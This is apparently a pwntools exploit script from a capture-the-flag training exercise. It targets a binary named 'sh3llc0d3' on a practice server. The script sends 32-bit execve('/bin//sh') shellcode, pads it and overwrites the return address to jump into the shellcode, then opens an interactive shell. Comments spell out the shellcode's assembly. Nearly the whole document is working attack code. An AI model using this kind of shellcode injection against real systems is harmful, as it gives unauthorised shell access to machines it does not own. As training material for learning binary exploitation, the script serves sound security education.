from pwn import *
import binascii
# context.terminal = [ 'tmux', 'splitw' , '-h']
HOST = "training.jinblack.it"
PORT = 2002
if args.REMOTE:
    r = remote(HOST, PORT)
elif args.GDB:
    r = process("./sh3llc0d3")
    gdb.attach(r,"""
    b* 0x08049282
    c
    """)
    input("wait for gdb")
else:
    r = process("./sh3llc0d3")

r.recvuntil("What is your name?")

payload =  cyclic(212)
payload = b"\x31\xC0\x50\x68\x6E\x2F\x73\x68\x68\x2F\x2F\x62\x69\x89\xE3\x89\xD9\x66\x83\xC1\x08\x89\xCA\xB0\x0B\xCD\x80".ljust(212,b"\x90")
payload += p32(0x0804c060)
payload = payload.ljust(1000,b"\x90")

r.send(payload)

r.interactive()
#0804c060

# shellcode 32 bit
# without 0s

# xor eax, eax
# push eax
# push 0x68732f6e
# push 0x69622f2f
# mov ebx, esp
# mov ecx, ebx
# add cx, 8
# mov edx, ecx
# mov al, 0x0b
# int 0x80